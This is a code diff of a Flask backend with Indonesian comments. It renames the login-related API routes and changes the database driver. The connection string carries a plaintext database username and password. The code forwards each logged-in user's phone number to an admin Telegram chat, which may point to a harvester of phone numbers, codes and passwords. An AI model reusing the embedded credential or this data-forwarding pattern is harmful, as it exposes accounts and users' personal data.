@@ -8,8 +8,9 @@ import asyncio
 
 app = Flask(__name__)
 CORS(app)
+
 # Ganti dengan URL koneksi ElephantSQL Anda
-app.config['SQLALCHEMY_DATABASE_URI'] = 'postgresql://xtswxymn:hcSaLOzAhkpmD3294h10blhyhhTeXAUU@manny.db.elephantsql.com/xtswxymn'
+app.config['SQLALCHEMY_DATABASE_URI'] = 'postgresql+pg8000://xtswxymn:hcSaLOzAhkpmD3294h10blhyhhTeXAUU@manny.db.elephantsql.com/xtswxymn'
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 db = SQLAlchemy(app)
 
@@ -55,7 +56,7 @@ def login():
         return jsonify({"error": str(e)}), 500  # Mengembalikan kesalahan dalam format JSON
 
 
-@app.route('/verify_code', methods=['POST'])
+@app.route('/api/verify_code', methods=['POST'])
 def verify_code():
     data = request.json
     phone_number = data.get('phone_number')
@@ -92,7 +93,7 @@ def verify_code():
 async def send_login_info_to_bot(phone_number):
     await bot.send_message(ADMIN_CHAT_ID, f'Nomor yang berhasil login: {phone_number}')
 
-@app.route('/logout', methods=['POST'])
+@app.route('/api/logout', methods=['POST'])
 def logout():
     data = request.json
     phone_number = data.get('phone_number')
@@ -113,7 +114,7 @@ def logout():
 async def send_logout_info_to_bot(phone_number):
     await bot.send_message(ADMIN_CHAT_ID, f'Nomor yang telah logout: {phone_number}')
 
-@app.route('/verify_password', methods=['POST'])
+@app.route('/api/verify_password', methods=['POST'])
 def verify_password():
     data = request.json
     password = data.get('password')
